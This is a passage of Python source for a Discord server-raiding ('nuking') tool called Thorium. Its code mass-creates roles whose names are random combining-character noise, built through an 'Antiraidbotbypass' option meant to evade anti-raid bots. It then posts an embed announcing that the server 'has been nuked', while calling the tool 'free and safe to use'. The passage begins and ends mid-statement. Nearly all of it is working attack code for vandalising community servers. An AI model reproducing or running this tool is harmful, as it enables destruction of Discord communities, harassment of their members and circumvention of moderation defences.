"̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r15 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r16 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])

                if Antiraidbotbypass == True:
                    rolename = r1 + r10 + r2 + r11 + r3 + r12 + r4 + r13 + r5 + r14 + r6 + r15 + r7 + r16 + r8 + r9
                    rolenameprint = r1 + "⚠" + r2 + "⚠" + r3 + "⚠" + r4 + "⚠" + r5 + "⚠" + r6 + "⚠" + r7 + "⚠" + r8 + "⚠"
                    
                if rainbow == 1:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xff0000)) 
                if rainbow == 2:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xff8000)) 
                if rainbow == 3:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xffff00)) 
                if rainbow == 4:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x80ff00)) 
                if rainbow == 5:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x00ff00)) 
                if rainbow == 6:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x00ff80))
                if rainbow == 7:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x00ffff)) 
                if rainbow == 8:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x0080ff)) 
                if rainbow == 9:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x0000ff)) 
                if rainbow == 10:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x8000ff)) 
                if rainbow == 11:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xff00ff)) 
                if rainbow == 12:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xff0080)) 
                if rainbow == 13:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xff0000)) 
                    rainbow = 0
                print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + " the role '" + rolenameprint + "' was created!")
                rainbow = rainbow + 1
                time.sleep(0.3)
            rainbow = 1
            Thorium_embed = discord.Embed(title="[Important Server Notification]", color=Embedcolor)
            Thorium_embed.add_field(name="[What happened?]", value="Im sorry to inform you that the server has been nuked by Thorium.", inline=False)
            Thorium_embed.add_field(name="[What is Thorium?]", value="Thorium is a nuking tool made by DummerGoki.\nIt is a powerful tool that can destroy discord servers quickly.\n[it is free and safe to use.]", inline=False)
            Thorium_embed.add_field(name="[What can you do?]", value="For your own safety,\nI recommend you to leave the server immediately if you have not been banned already.\n [Dummergoki is not responsible for any damage!]", inline=False)

            for i in range (10):
                r1 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r2 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r3 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r4 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r5 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r6 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r7 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r8 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r9 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r10 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r11 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r12 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r13 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r14 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r15 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r16 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", 